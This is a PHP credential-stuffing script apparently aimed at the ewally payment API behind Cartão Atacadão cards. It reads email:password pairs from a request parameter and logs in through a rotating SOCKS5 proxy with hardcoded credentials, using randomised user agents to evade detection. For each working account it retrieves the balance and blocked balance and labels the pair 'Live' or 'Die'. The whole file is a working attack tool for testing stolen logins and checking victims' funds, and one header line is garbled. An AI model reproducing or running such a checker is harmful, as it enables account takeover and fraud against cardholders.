<?php
error_reporting(0);
usleep(5);
if (file_exists("cookie.txt")!== false) {unlink("cookie.txt");fopen
("cookie.txt", 'w+');fclose
("cookie.txt");}else{fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}

  function getStr($string, $start, $end) {
   $str = explode($start, $string);
   $str = explode($end, $str[1]);  
   return $str[0];
 }

 function multiexplode($string) {
   $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
   $one = str_replace($delimiters, $delimiters[0], $string);
   $two = explode($delimiters[0], $one);
   return $two;
 }

 function random_ua()
 {
  $tiposDisponiveis = array("Chrome", "Firefox", "Opera", "Explorer");
  $tipoNavegador = $tiposDisponiveis[array_rand($tiposDisponiveis)];
  switch ($tipoNavegador) {
    case 'Chrome':
    $navegadoresChrome = array(
      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
    );
    return $navegadoresChrome[array_rand($navegadoresChrome)];
    break;
    case 'Firefox':
    $navegadoresFirefox = array(
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
      'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
      'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
      'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
      'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
      'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
      'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
      'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
      'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
    );
    return $navegadoresFirefox[array_rand($navegadoresFirefox)];
    break;
    case 'Opera':
    $navegadoresOpera = array(
      "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
      'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
      'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
      'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
      'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
      'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
      'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
      'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
      'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
      'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
    );
    return $navegadoresOpera[array_rand($navegadoresOpera)];
    break;
    case 'Explorer':
    $navegadoresOpera = array(
      "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
      'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
      'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
      'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
      'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
    );
    return $navegadoresOpera[array_rand($navegadoresOpera)];
    break;
  }
}
$ua = random_ua();

$lista = $_GET['lista'];
$email = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.ewally.com.br/user/login');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, 'socks5://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'qcbweomc-rotate:gb48qce21hny');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'content-type: application/json',
  'user-agent: '.$ua,
  'origin: https://apag.cartaoatacadao.com.br',
  'referer: https://apag.cartaoatacadao.com.br/',
  'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
));
curl_setopt($ch, CURLOPT_POSTFIELDS,'{"username":"svcProdAtacadao_'.$email.'","password":"'.$senha.'"}');
$p1 = curl_exec($ch);

if (strpos($p1,'token')) {
  $token = getStr($p1,'token":"','"');

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.ewally.com.br/account/balance');
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
  curl_setopt($ch, CURLOPT_PROXY, 'socks5://p.webshare.io:80');
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'qcbweomc-rotate:gb48qce21hny');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authorization: Bearer '.$token,
'user-agent: '.$ua,
'origin: https://apag.cartaoatacadao.com.braoatacadao.com.br/',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
  ));
  $p2 = curl_exec($ch);
  $saldo = getStr($p2,'balance":',',');
  $saldoBloqueado = getStr($p2,'blockedBalance":','}');

  echo "Live: $lista Saldo: $saldo Bloqueado: $saldoBloqueado";

}elseif (strpos($p1,'"code":107,"msg"')) {
  echo "Bloqueado: $lista";
}else{
  echo "Die: $lista Retorno: $p1";
}